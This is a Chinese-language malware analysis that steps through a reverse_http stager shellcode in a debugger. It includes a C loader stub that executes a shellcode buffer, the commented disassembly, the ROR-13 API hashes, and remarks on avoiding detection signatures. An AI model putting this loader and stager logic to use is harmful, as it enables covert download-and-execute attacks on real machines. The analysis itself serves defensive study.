这次使用的reverse\_http的shellcode

0x01 生成木马
---------

首先生成一个C语言版的payload，用最简单的方法加载进内存

```c++
#include<stdio.h>
#include<Windows.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char buf[] = "";
int main() {
    __asm {
        mov ecx, offset buf
        jmp ecx
    }
}
```

这里让数据段可执行，这样就不需要动态开辟内存，调试的时候shellcode的地址不会变

0x02 DEBUG
----------

用二进制看下payload

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee4f54f74ddc6192f7c395a3c4f5f41c6b782a5a.png)

是可以看到一些正常字符的，说明shellcode里面不全部是代码，还放着一些数据

把程序放到x32dbg里面调试，可以图片搭配后面的汇编代码看可能会清晰一点

下面开始调试

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-391a179f72bf4f24b0b5a16d652f0bf0d9f956de.png)

CLD先将DF标志位置零，对应的硬编码是FC，印象里很多shellcode开头都是FC，可能是为了严谨吧

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c4b7e75714681aa0a2338408eab1467c78c3e898.png)

这里CALL到5F40A7后执行的代码

先把跳过来的下个地址保存到ebp，这个地址是后面找函数的关键地址，找到函数后循环都会经过这里

push了wininet字符串和0x726774C，这几个字符串都是有用的，特别是0x726774C是一个特征码，后面就会看到是怎么用的

最后CALL回到005F401E

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5abd61eb734da92725944cb616faf325627e5f86.png)

这里截图截不全，下面汇编会把整段写明白

pushad先把寄存器全部压栈

提升堆栈

edx置零

后面这个应该挺熟悉的，在编写shellcode的文章里面有

```asm
005F401E                   pushad                                       
005F401F                   mov ebp,esp                                 
005F4021                   xor edx,edx                                  
005F4023                   mov edx,dword ptr fs:[edx+30]                 
005F4027                   mov edx,dword ptr ds:[edx+C]                 
005F402A                   mov edx,dword ptr ds:[edx+14]
#这里先找到第一个LDR_DATA_TABLE_ENTRY结构
005F402D                   mov esi,dword ptr ds:[edx+28]
#找到BaseDllName，得到文件名
005F4030                   movzx ecx,word ptr ds:[edx+26]
#得到文件名的长度
005F4034                   xor edi,edi                   
005F4036                   xor eax,eax                                   
005F4038                   lodsb                
005F4039                   cmp al,61                                     
005F403B                   jl test.5F403F                               
005F403D                   sub al,20                                     
005F403F                   ror edi,D                                     
005F4042                   add edi,eax                                   
005F4044                   loop test.5F4036
#这段到这里都是遍历文件名修改edi的值，第一次遍历是没用的，可以先不看，后面的值会加上函数遍历的值
005F4046                   push edx                                     
005F4047                   push edi                                     
005F4048                   mov edx,dword ptr ds:[edx+10]                
005F404B                   mov eax,dword ptr ds:[edx+3C]                
005F404E                   add eax,edx                               
005F4050                   mov eax,dword ptr ds:[eax+78]
#得到导出表的地址
005F4053                   test eax,eax 
005F4055                   je test.5F40A1
#检查eax是否为0，为0则跳跃，为0其实就是这个文件没有导出表
005F40A1                   pop edi                          
005F40A2                   pop edx                                       
005F40A3                   mov edx,dword ptr ds:[edx]   #下个LDR_DATA_TABLE_ENTRY的结构放到edx    
005F40A5                   jmp test.5F402D  #返回5F402D重复过程

#下个循环就到ntdll.dll了，这个dll有导出表，走到test eax,eax继续往下执行，可以看下面的代码
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ca1e2062875bf1c10a2ddd8927902e8183d39ffc.png)

接上后面的代码

```asm
005F4057                   add eax,edx                                 
005F4059                   push eax                                     
005F405A                   mov ecx,dword ptr ds:[eax+18]     #NumberOfNames 得到函数数量写入ecx内          
005F405D                   mov ebx,dword ptr ds:[eax+20]    #AddressOfNames 函数名称偏移           
005F4060                   add ebx,edx                                  
005F4062                   jecxz test.5F40A0                 #ecx为0回到5F40A0，简单说就是函数遍历完就回去    
005F4064                   dec ecx                            
005F4065                   mov esi,dword ptr ds:[ebx+ecx*4] #获取倒数第一个函数偏移          
005F4068                   add esi,edx                      #获取函数地址
005F406A                   xor edi,edi

#这段是找函数的
005F406C                   xor eax,eax
005F406E                   lodsb
005F406F                   ror edi,D            #edi循环右移13位
005F4072                   add edi,eax          #把遍历的字符的十六进制
005F4074                   cmp al,ah
005F4076                   jne test.5F406C
#遍历函数名
#打个比方有strcpy函数名
ror edi,D   00000000000000000000000000000000    0       add edi,eax 00000000000000000000000001110011 73 s
ror edi,D   00000000000000111001100000000000 39800      add edi,eax 00000011100110000000000001110100 74 t
ror edi,D   00000011101000000001110011000000 3A01CC0    add edi,eax 00000011101000000001110100110010 72 r
ror edi,D   11101001100100000001110100000000 E9901D00   add edi,eax 11101001100100000001110101100011 63 c
ror edi,D   11101011000111110100110010000000 EB1F4C80   add edi,eax 11101011000111110100110011110000 70 p
ror edi,D   01100111100001110101100011111010 678758FA   add edi,eax 01100111100001110101100101110011 79 y
ror edi,D   11001011100110110011110000111010 CB9B3C3A   add edi,eax 11001011100110110011110000111010 0  00

005F4078                   add edi,dword ptr ss:[ebp-8]         #ebp-8存放文件名遍历后的值
005F407B                   cmp edi,dword ptr ss:[ebp+24]        
#ebp+24存放着0x726774C，就是前面说的特征码，对比到了就说明是要取的函数，对比不到就回去           
005F407E                   jne test.5F4062
```

可以看到上面这种遍历的方法不要使用GetProcAddress得到函数地址，也不需要通过push字符串，有效的去掉了一些特征，除了遍历有点慢之外没什么缺点

在ecx遍历完之后会跳到005F40A1继续找下个dll的地址

当然下个就是kernel32.dll了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b9782b0b2bc1c801e20dc0aa47fa57096aa71164.png)

这里就是匹配到之后执行的代码

```asm
005F4080                   pop eax                                
005F4081                   mov ebx,dword ptr ds:[eax+24]   #AddressOfNameOrdinals              
005F4084                   add ebx,edx                     #AddressOfNameOrdinals实际地址
005F4086                   mov cx,word ptr ds:[ebx+ecx*2]   #得到函数序号
005F408A                   mov ebx,dword ptr ds:[eax+1C]    
005F408D                   add ebx,edx                      #得到AddressOfFunctions的起始位置
005F408F                   mov eax,dword ptr ds:[ebx+ecx*4]  
005F4092                   add eax,edx                      #得到函数指针             
005F4094                   mov dword ptr ss:[esp+24],eax    #函数指针放入栈中，这里放的也很巧妙
005F4098                   pop ebx                          #pop到寄存器 堆栈平衡     
005F4099                   pop ebx                          #pop到寄存器 堆栈平衡  
005F409A                   popad            #现在函数指针的位置在esp+1c，popad后函数指针刚好覆盖在eax上相当于没动
005F409B                   pop ecx          
#在最开始5F40A7->5F401E最后回去的时候用的是call ebp，所以下个地址也被压入栈中，这里刚好把下个地址取出来
005F409C                   pop edx      #去除0x726774C
005F409D                   push ecx     #再次压入5F401E的下个地址005F40BA
005F409E                   jmp eax      #这里的eax就是函数地址了，这次找到是LoadLibraryA函数
#其实这里是模仿了call，call就是先压入下个地址，然后jmp过去，这里指定了返回的地址
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9366b6c521e86b19cdbda2370ea5f1d900f11eab.png)

可以看到堆栈中返回地址是005F40BA，LoadLibraryA的参数是wininet，EAX中的参数是LoadLibraryA的函数指针

接下来走到这里

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-33a90c88d0b8f1b20e22ae99746746ce4e3e22e5.png)

这时候wininet.dll已经加载进内存了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b7f89896bfb4a1ae59b3386a308813a332f84e11.png)

```asm
005F40BA                   xor edi,edi
005F40BC                   push edi
005F40BD                   push edi
005F40BE                   push edi
005F40BF                   push edi
005F40C0                   push edi 
005F40C1                   push A779563A        #这里是0x726774C类似的东西，通过这个查找下个函数
005F40C6                   call ebp             #005F401E，回到pushad那里
```

到这里又是重复一次循环，去遍历函数名找到循环右移13位之后为A779563A的函数

这里就不重复写一遍了

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e3c07f2cb27f3b02db1a275b7402010cb5b39710.png)

A779563A对应的函数是InternetOpenA

```c++
HINTERNET InternetOpenA(
  LPCSTR lpszAgent,
  DWORD  dwAccessType,
  LPCSTR lpszProxy,
  LPCSTR lpszProxyBypass,
  DWORD  dwFlags
);
```

可以看到堆栈中参数都为0000000，执行完之后EAX是HINTERNET

跳到005F40C8继续

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-851111d3e6cc17a82e79efbad4f8f737062fb630.png)

005F4151又跳了一次

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d95bca6572c61dc68703c671562cda92373ac19d.png)

005F40C8-&gt;005F4151-&gt;005F431F

```asm
005F40C8                   jmp test.5F4151

005F4151                   jmp test.5F431F

005F431F                   call test.5F40CD     
#这里也是很巧妙的设计，用call将需要的参数压入栈中，并跳转，避免了push的使用
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7e113c769068d83c313f83eb6c86ce2cb13759e6.png)

005F4324后面的就是IP地址的字符串，就是指向字符串的指针，用CALL压入栈中跳到005F40CD

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-297675c196f85ab763c3bfdb2e81772628d40e02.png)

```asm
005F40CD                   pop ebx
005F40CE                   xor ecx,ecx      #置零

005F40D0                   push ecx         #dwContext  NULL
005F40D1                   push ecx         #dwFlags    NULL
005F40D2                   push 3           #INTERNET_SERVICE_HTTP宏定义
005F40D4                   push ecx         #lpszPassword  NULL
005F40D5                   push ecx         #lpszUserName   NULL
005F40D6                   push 52          #80端口
005F40DB                   push ebx         #用call压入的字符串
005F40DC                   push eax         #上个函数的结果HINTERNET
#这些都是下个函数的参数            八个

005F40DD                   push C69F8957            #下个函数的特征码
005F40E2                   call ebp                 #回到005F401E再次循环
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-782a80652dc5ecdea663c7da47dc9933580c60d3.png)

InternetConnectA

```c++
HINTERNET InternetConnectA(
  HINTERNET     hInternet,
  LPCSTR        lpszServerName,
  INTERNET_PORT nServerPort,
  LPCSTR        lpszUserName,
  LPCSTR        lpszPassword,
  DWORD         dwService,
  DWORD         dwFlags,
  DWORD_PTR     dwContext
);
```

对应上面的八个参数，执行完后跳到005F40E4

接下来又是几次跳转

005F40E4-&gt;005F4156

还是相同的方法用CALL压入字符串后跳转

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-31dc2a098f3371611f7c683191746782c044c203.png)

这次压入的是完整shellcode的路径

跳到005F40E6

直接贴代码吧不截图了

```asm
005F40E6                   pop ebx
005F40E7                   xor edx,edx
005F40E9                   push edx         #dwContext
005F40EA                   push 84400200        #dwFlags NTERNET_FLAG_NO_CACHE_WRITE宏定义0X4000000
005F40EF                   push edx     #lplpszAcceptTypes
005F40F0                   push edx     #lpszReferrer
005F40F1                   push edx     #lpszVersion
005F40F2                   push ebx     #lpszObjectName
005F40F3                   push edx     #LPCSTR
005F40F4                   push eax     #hConnect
#同样的上面都是下个函数的参数，也是八个参数
005F40F5                   push 3B2E55EB    #下个函数的特征码
005F40FA                   call ebp         #回到005F401E再次循环找函数
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-61129252290c4264d93c303cea6dd4af0560fc79.png)

HttpOpenRequestA

```c++
HINTERNET HttpOpenRequestA(
  HINTERNET hConnect,
  LPCSTR    lpszVerb,
  LPCSTR    lpszObjectName,
  LPCSTR    lpszVersion,
  LPCSTR    lpszReferrer,
  LPCSTR    *lplpszAcceptTypes,
  DWORD     dwFlags,
  DWORD_PTR dwContext
);
```

执行函数之后跳到005F40FC位置

下面是005F40FC执行的代码

```asm
005F40FC                   mov esi,eax      #上个函数返回的HINTERNET存入esi
005F40FE                   add ebx,50       #这里的ebx还是指向路径的，+50之后就到请求头
005F4101                   xor edi,edi
005F4103                   push edi         #dwOptionalLength
005F4104                   push edi         #lpOptional
005F4105                   push FFFFFFFF    #dwHeadersLength
005F4107                   push ebx         #LPCSTR    
005F4108                   push esi         #HINTERNET 
#下个函数的参数
005F4109                   push 7B18062D
#下个函数的特征码
005F410E                   call ebp         #回到005F401E再次循环找函数
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-37fe98dcf154b764dd034607e28aa445afdabbc6.png)

找到函数HttpSendRequestA

```c++
BOOL HttpSendRequestA(
  HINTERNET hRequest,
  LPCSTR    lpszHeaders,
  DWORD     dwHeadersLength,
  LPVOID    lpOptional,
  DWORD     dwOptionalLength
);
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-25396c052bae0123dad3f466a0b4e762c7f95fb5.png)

再跳到005F4110

```asm
005F4110                   test eax,eax         #检测上个函数执行是否成功，因为上个函数的返回值是布尔类型
005F4112                   je test.5F42DB
005F4118                   xor edi,edi
005F411A                   test esi,esi         #检测HINTERNET是否为NULL
005F411C                   je test.5F4122
005F411E                   mov ecx,edi

005F4120                   jmp test.5F412B      #直接跳过
005F4122                   push 5DE2C5AA
005F4127                   call ebp
005F4129                   mov ecx,eax

005F412B                   push 315E2145        #下个函数的特征码
005F4130                   call ebp             #回到005F401E再次循环找函数
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-75f4b4402d9885c77865dc25b2f194051639e317.png)

GetDesktopWindow函数无参，作用是获取桌面句柄

跳到005F4132

```asm
005F4132                   xor edi,edi
005F4134                   push edi
005F4135                   push 7
005F4137                   push ecx
005F4138                   push esi
005F4139                   push eax
005F413A                   push BE057B7
005F413F                   call ebp
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-689adf8e5eeaeee28f40cb2666e02357b53121a3.png)

InternetErrorDlg函数是检测错误的，这个不是关键的函数就不提了，简单说如果有错误会在提供的窗口句柄上显示错误，所以上面要得到桌面的句柄

执行完之后跳到

```asm
005F42E2                   push 40
005F42E4                   push 1000
005F42E9                   push 400000
005F42EE                   push edi
005F42EF                   push E553A458
005F42F4                   call ebp
```

这里应该是经典了，不用说师傅们都知道是VirtualAlloc，开辟了一块0x400000大小的内存，可读可写可执行

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-aee87162e28430003136e1257439e75f7aa9625a.png)

执行完之后跳到005F42F6

```asm
005F42F6                   xchg ebx,eax     #jia
005F42F7                   mov ecx,0        #ecx置零
005F42FC                   add ecx,ebx      #ecx得到VirtualAlloc的地址
005F42FE                   push ecx         
005F42FF                   push ebx         
005F4300                   mov edi,esp      
005F4302                   push edi     #dwModifiers
005F4303                   push 2000    #dwHeadersLength
005F4308                   push ebx     #lpszHeaders
005F4309                   push esi     #hRequest
005F430A                   push E2899612
005F430F                   call ebp
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b69b3bc35986d8ab854d4b7f48f6ae46fc7a4c53.png)

InternetReadFile

```c++
BOOL InternetReadFile(
  HINTERNET hFile,
  LPVOID    lpBuffer,
  DWORD     dwNumberOfBytesToRead,
  LPDWORD   lpdwNumberOfBytesRead
);
```

然后就是循环读0x2000大小

```asm
005F4311                   test eax,eax
005F4313                   je test.5F42DB
005F4315                   mov eax,dword ptr ds:[edi]   
#InternetReadFile最后一个参数是输出参数，输出读到的实际大小，上面把这个指针设置到了edi，从这里读出来实际的大小，如果不是0则回去循环，是0就说明shellcode已经全部读完了
005F4317                   add ebx,eax
005F4319                   test eax,eax
005F431B                   jne test.5F4302

    005F4302                   push edi     #dwModifiers
    005F4303                   push 2000    #dwHeadersLength
    005F4308                   push ebx     #lpszHeaders
    005F4309                   push esi     #hRequest
    005F430A                   push E2899612
    005F430F                   call ebp

005F431D                   pop eax
005F431E                   ret
```

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e4aeb8ad42451d8d1bd2b373fa9bcffbae5b10ca.png)

0x03 汇编代码
---------

写个完整的

把汇编代码全部提取出来

写个python脚本

```python
a = open("asm.txt", "r")
asm_ = a.read().split("\n")
asm_command = ""
for i in asm_:
    asm_command += i.split("|")[0].replace(":", "")
    asm_command += i.split("|")[2].lstrip()
    asm_command += "\n"
print(asm_command)

```

下面是提取的汇编代码

```asm
005F4018 <test.buf>        cld                  #修改DF标志位
005F4019                   call test.5F40A7     #跳到test.5F40A7

#005F40A7->005F401E         start
005F401E                   pushad                                       
005F401F                   mov ebp,esp                                 
005F4021                   xor edx,edx                                  
005F4023                   mov edx,dword ptr fs:[edx+30]                 
005F4027                   mov edx,dword ptr ds:[edx+C]                 
005F402A                   mov edx,dword ptr ds:[edx+14]                 
005F402D                   mov esi,dword ptr ds:[edx+28]                 
005F4030                   movzx ecx,word ptr ds:[edx+26]               
005F4034                   xor edi,edi                                   
005F4036                   xor eax,eax                                   
005F4038                   lodsb                                         
005F4039                   cmp al,61                                     
005F403B                   jl test.5F403F                               
005F403D                   sub al,20                                     
005F403F                   ror edi,D                                     
005F4042                   add edi,eax                                   
005F4044                   loop test.5F4036                             
005F4046                   push edx                                     
005F4047                   push edi                                     
005F4048                   mov edx,dword ptr ds:[edx+10]                
005F404B                   mov eax,dword ptr ds:[edx+3C]                
005F404E                   add eax,edx                               
005F4050                   mov eax,dword ptr ds:[eax+78] 
005F4053                   test eax,eax 
005F4055                   je test.5F40A1                               

# 有导出表执行的代码
005F4057                   add eax,edx      #得到导出表地址
005F4059                   push eax         #导出表地址压栈
005F405A                   mov ecx,dword ptr ds:[eax+18]        #得到函数个数
005F405D                   mov ebx,dword ptr ds:[eax+20]        #AddressOfNames             
005F4060                   add ebx,edx                          #AddressOfNames地址
005F4062                   jecxz test.5F40A0                    #函数遍历结束后跳回5F40A0
005F4064                   dec ecx                              #自减ecx
005F4065                   mov esi,dword ptr ds:[ebx+ecx*4]
005F4068                   add esi,edx
005F406A                   xor edi,edi                                   
005F406C                   xor eax,eax                                   
005F406E                   lodsb                                         
005F406F                   ror edi,D                                     
005F4072                   add edi,eax                                   
005F4074                   cmp al,ah                                    
005F4076                   jne test.5F406C                               
005F4078                   add edi,dword ptr ss:[ebp-8]                 
005F407B                   cmp edi,dword ptr ss:[ebp+24]                 
005F407E                   jne test.5F4062    

# 对比到后执行的代码
005F4080                   pop eax                                       
005F4081                   mov ebx,dword ptr ds[eax+24]                 
005F4084                   add ebx,edx                                   
005F4086                   mov cx,word ptr ds[ebx+ecx*2]                 
005F408A                   mov ebx,dword ptr ds[eax+1C]                 
005F408D                   add ebx,edx                                   
005F408F                   mov eax,dword ptr ds[ebx+ecx*4]               
005F4092                   add eax,edx                                   
005F4094                   mov dword ptr ss[esp+24],eax                 
005F4098                   pop ebx                                       
005F4099                   pop ebx                                       
005F409A                   popad                                         
005F409B                   pop ecx                                       
005F409C                   pop edx                                       
005F409D                   push ecx                                     
005F409E                   jmp eax                                       
005F40A0                   pop eax          

#jmp 005F4055       start
005F40A1                   pop edi                                       
005F40A2                   pop edx                                       
005F40A3                   mov edx,dword ptr ds:[edx]                   
005F40A5                   jmp test.5F402D
#jmp 005F4055       end

#5F40A7       start
005F40A7                   pop ebp      #这里是call所以是把005F401E地址存到ebp中
005F40A8                   push 74656E      #net
005F40AD                   push 696E6977    #wini
005F40B2                   push esp         #相当于压入指向wininet的指针
005F40B3                   push 726774C     #push字符串
005F40B8                   call ebp         #回到005F401E
#5F40A7         end

#LoadLibraryA执行完到的地方    start
005F40BA                   xor edi,edi
005F40BC                   push edi
005F40BD                   push edi
005F40BE                   push edi
005F40BF                   push edi
005F40C0                   push edi
005F40C1                   push A779563A        
005F40C6                   call ebp             #005F401E
#LoadLibraryA执行完到的地方    end

005F40C8                   jmp test.5F4151

#InternetConnectA的参数还有特征码           start
005F40CD                   pop ebx
005F40CE                   xor ecx,ecx
005F40D0                   push ecx
005F40D1                   push ecx
005F40D2                   push 3
005F40D4                   push ecx
005F40D5                   push ecx
005F40D6                   push 52
005F40DB                   push ebx
005F40DC                   push eax
005F40DD                   push C69F8957
005F40E2                   call ebp
#InternetConnectA的参数还有特征码           end

005F40E4                   jmp test.5F4156

#HttpOpenRequestA的参数还有特征码           start
005F40E6                   pop ebx
005F40E7                   xor edx,edx
005F40E9                   push edx
005F40EA                   push 84400200
005F40EF                   push edx
005F40F0                   push edx
005F40F1                   push edx
005F40F2                   push ebx
005F40F3                   push edx
005F40F4                   push eax
005F40F5                   push 3B2E55EB
005F40FA                   call ebp
#HttpOpenRequestA的参数还有特征码           end

#HttpSendRequestA的参数还有特征码   start
005F40FC                   mov esi,eax
005F40FE                   add ebx,50
005F4101                   xor edi,edi
005F4103                   push edi
005F4104                   push edi
005F4105                   push FFFFFFFF
005F4107                   push ebx
005F4108                   push esi
005F4109                   push 7B18062D
005F410E                   call ebp
#HttpSendRequestA           end

#GetDesktopWindow       start
005F4110                   test eax,eax
005F4112                   je test.5F42DB
005F4118                   xor edi,edi
005F411A                   test esi,esi
005F411C                   je test.5F4122
005F411E                   mov ecx,edi
005F4120                   jmp test.5F412B
005F4122                   push 5DE2C5AA
005F4127                   call ebp
005F4129                   mov ecx,eax
005F412B                   push 315E2145
005F4130                   call ebp
#GetDesktopWindow       end

#InternetErrorDlg           start
005F4132                   xor edi,edi
005F4134                   push edi
005F4135                   push 7
005F4137                   push ecx
005F4138                   push esi
005F4139                   push eax
005F413A                   push BE057B7
005F413F                   call ebp
#InternetErrorDlg           end

#检查InternetErrorDlg返回值选择继续执行的代码
005F4141                   mov edi,2F00
005F4146                   cmp edi,eax              #没报错这里返回0，这里不跳转
005F4148                   je test.5F4101
005F414A                   xor edi,edi
005F414C                   jmp test.5F42E2          #跳到5F42E2
005F4151                   jmp test.5F431F
005F4156                   call test.5F40E6                             

#完整shellcode路径，不是代码
005F415B                   das
005F415C                   bound esi,qword ptr ds:[esi+31]
005F415F                   push ebx

#无用字符
005F4160                   add byte ptr ss:[ebp-5],ch                   
005F4163                   xor edi,edx
005F4165                   pop dword ptr ds:[ebx-24F1EAC3]
005F416B                   inc esp
005F416C                   pushad
005F416D                   ja test.5F4149
005F416F                   aas
005F4170                   and ebp,ebx
005F4172                   mov esp,gs
005F4174                   mov eax,F7DBC8C
005F4179                   mov ah,91
005F417B                   outsb
005F417C                   daa
005F417D                   leave
005F417E                   inc eax
005F417F                   or dword ptr ds:[edx],ebx
005F4181                   mov al,22
005F4183                   mov esp,F4832A95
005F4189                   sub ch,dh
005F418B                   cmp cl,byte ptr ds:[ecx]
005F418D                   and eax,1CDD912B
005F4192                   adc dword ptr ds:[4992030A],esi
005F4198                   mov ebp,D0A832C5
005F419D                   ret BA26
005F41A0                   xchg dword ptr ds:[edi-80],esp                 
005F41A3                   mov dh,B9
005F41A5                   lds edi,fword ptr ds:[eax+854A77]
#无用字符

#请求头字符，数据       start
005F41AB                   push ebp
005F41AC                   jae test.5F4213
005F41AE                   jb test.5F41DD
005F41B0                   inc ecx
005F41B1                   outsb
005F41B4                   je test.5F41F0
005F41B6                   and byte ptr ss:[ebp+6F],cl
005F41B9                   jp test.5F4224
005F41BB                   insb
005F41BC                   insb
005F41BD                   popad
005F41BE                   das
005F41BF                   xor eax,2820302E
005F41C4                   arpl word ptr ds:[edi+6D],bp
005F41C7                   jo test.5F422A
005F41C9                   je test.5F4234
005F41CB                   bound ebp,qword ptr ss:[ebp+3B]
005F41CF                   and byte ptr ss:[ebp+53],cl
005F41D2                   dec ecx
005F41D3                   inc ebp
005F41D4                   and byte ptr ds:[ecx],bh
005F41D6                   xor byte ptr cs:[ebx],bh
005F41D9                   and byte ptr ds:[edi+69],dl
005F41DC                   outsb
005F41DD                   outsd
005F41DF                   ja test.5F4254
005F41E1                   and byte ptr ds:[esi+54],cl
005F41E4                   and byte ptr ds:[esi],dh
005F41E6                   xor byte ptr cs:[ebx],bh
005F41E9                   and byte ptr ds:[edi+4F],dl
005F41EC                   push edi
005F41ED                   xor al,3B
005F41F0                   and byte ptr ds:[edx+esi*2+69],dl
005F41F4                   outsb
005F41F7                   je test.5F4228
005F41F9                   xor eax,D29302E
005F41FE                   or al,byte ptr ds:[eax]
005F4200                   push edi
#请求头            end

#无用字符
005F4201                   xlat
005F4202                   std
005F4203                   add dword ptr ds:[esi+1B],ebx
005F4207                   push 35
005F4209                   loop test.5F421E
005F420B                   xor eax,4DA22A71
005F4210                   in eax,dx
005F4211                   push cs
005F4212                   push FFFFFFC2
005F4214                   or ebx,eax
005F4216                   enter 7BC7,67
005F421A                   shr byte ptr ds:[esi-5B02E9C6],1
005F4220                   mov dh,37
005F4222                   jl test.5F427F
005F4224                   das
005F4225                   iretd
005F4226                   or byte ptr ss:[ebp-2D],ah
005F4229                   mov ch,3D
005F422B                   and ah,byte ptr ds:[eax+17]
005F422E                   movsd
005F422F                   xlat
005F4230                   lahf
005F4231                   adc dl,byte ptr ds:[ecx+2D]
005F4234                   rcr dword ptr ds:[eax+edx],cl
005F4237                   xor dword ptr ds:[ecx+1],ebp
005F423A                   mov dl,FE
005F423C                   enter A3DC,E4
005F4240                   sbb dword ptr ds:[edx],edi
005F4242                   int3
005F4243                   ja test.5F41E4
005F4245                   ???
005F4246                   cli
005F4247                   sub dword ptr ds:[ecx-46FC2069],esi
005F424D                   ???
005F424E                   jl test.5F41EC
005F4250                   inc ebp
005F4251                   pushfd
005F4252                   sar byte ptr ds:[edx-1351DB2F],1
005F4258                   js test.5F426D
005F425A                   or al,C2
005F425C                   nop
005F425D                   test dword ptr ds:[edi+24],ebp
005F4261                   xor edx,dword ptr ds:[eax]
005F4263                   or dword ptr fs:[edi-76],eax
005F4267                   push ebx
005F4268                   inc edx
005F4269                   sahf
005F426A                   pop edx
005F426B                   scasd
005F426C                   xchg ebp,eax
005F426D                   out F9,eax
005F426F                   cmp al,AB
005F4271                   aam 1E
005F4273                   pop ds
005F4274                   shr byte ptr ds:[ebx-42],cl
005F4277                   insb
005F4278                   test edi,ecx
005F427A                   push ecx
005F427C                   xchg edx,eax
005F427D                   jg test.5F42D0
005F427F                   std
005F4280                   outsb
005F4281                   dec esi
005F4282                   mov eax,dword ptr ds:[8FE22E3D]
005F4287                   mov al,72
005F4289                   enter EC01,DE
005F428D                   or eax,eax
005F4290                   push ss
005F4291                   into
005F4292                   adc al,63
005F4294                   fdivr st(0),qword ptr ds:[eax+16]
005F4297                   add ebx,dword ptr ds:[eax-426ABF28]
005F429D                   jle test.5F4242
005F429F                   jae test.5F42B7
005F42A1                   lds esp,fword ptr ds:[edi-6B5B966]
005F42A7                   jge test.5F4308
005F42A9                   xchg esp,eax
005F42AA                   les esp,fword ptr ds:[ebx-38A60C87]
005F42B0                   mov ah,cl
005F42B2                   xchg dword ptr ds:[edi-163B9E4],esi
005F42B8                   push esi
005F42B9                   fild st(0),dword ptr ds:[esi+44]
005F42BC                   out dx,eax
005F42BD                   adc esi,esi
005F42BF                   mul bl
005F42C1                   adc dword ptr ds:[ecx-75],eax
005F42C4                   push ebx
005F42C5                   push es
005F42C6                   cmp al,9D
005F42C8                   pushfd
005F42C9                   clc
005F42CA                   jge test.5F4337
005F42CC                   test eax,C2DA2487
005F42D1                   test al,D7
005F42D3                   jmp 48C7358C
005F42D8                   and ch,byte ptr ds:[ebx]
005F42DA                   add byte ptr ds:[eax-10],ch
005F42DD                   mov ch,A2
005F42DF                   push esi
005F42E0                   call ebp
#无用字符

#VirtualAlloc           start
005F42E2                   push 40
005F42E4                   push 1000
005F42E9                   push 400000
005F42EE                   push edi
005F42EF                   push E553A458
005F42F4                   call ebp
#VirtualAlloc           end

#InternetReadFile           start
005F42F6                   xchg ebx,eax
005F42F7                   mov ecx,0
005F42FC                   add ecx,ebx
005F42FE                   push ecx
005F42FF                   push ebx
005F4300                   mov edi,esp
005F4302                   push edi
005F4303                   push 2000
005F4308                   push ebx
005F4309                   push esi
005F430A                   push E2899612
005F430F                   call ebp
#InternetReadFile           end

#InternetReadFile循环         start
005F4311                   test eax,eax
005F4313                   je test.5F42DB
005F4315                   mov eax,dword ptr ds[edi]
005F4317                   add ebx,eax
005F4319                   test eax,eax
005F431B                   jne test.5F4302
005F431D                   pop eax
005F431E                   ret
#InternetReadFile循环         end

005F431F                   call test.5F40CD

#IP地址字符串，这些都是数据，不是代码
005F4324                   xor dword ptr ds:[eax],esi
005F4326                   xor dword ptr cs:[ebx],esi
005F4329                   xor byte ptr ds:[esi],ch
005F432B                   xor al,2E
005F432D                   xor dh,byte ptr ds:[eax]
005F432F                   xor al,0
005F4331                   adc dh,byte ptr ds:[esi+edx*2]
005F4334                   js test.5F4336
```

0x04 总结
-------

0x0726774C------LoadLibraryA  
0xA779563A------InternetOpenA  
0xC69F8957------InternetConnectA  
0x3B2E55EB-----HttpOpenRequestA  
0x7B18062D-----HttpSendRequestA  
0x315E2145-----GetDesktopWindow  
0x0BE057B7-----InternetErrorDlg  
0xE553A458-----VirtualAlloc  
0xE2899612-----InternetReadFile

这是这段shellcode调用的所有函数

1. LoadLibraryA加载wininet.dll
2. InternetOpenA-&gt;InternetConnectA-&gt;HttpOpenRequestA-&gt;HttpSendRequestA 创建连接发起请求
3. GetDesktopWindow-&gt;InternetErrorDlg 查找报错
4. VirtualAlloc开辟内存
5. InternetReadFile读入完整shellcode

可以看到这段shellcode其实也只是一个远程下载的功能，当然整个shellcode一环扣一环感觉连接的很紧凑

不像之前学着写的那样先把全部函数读进来执行

除了循环多了点没有什么缺点，特别是InternetReadFile这里多次找这个函数，可以通过把函数地址压栈避免这个情况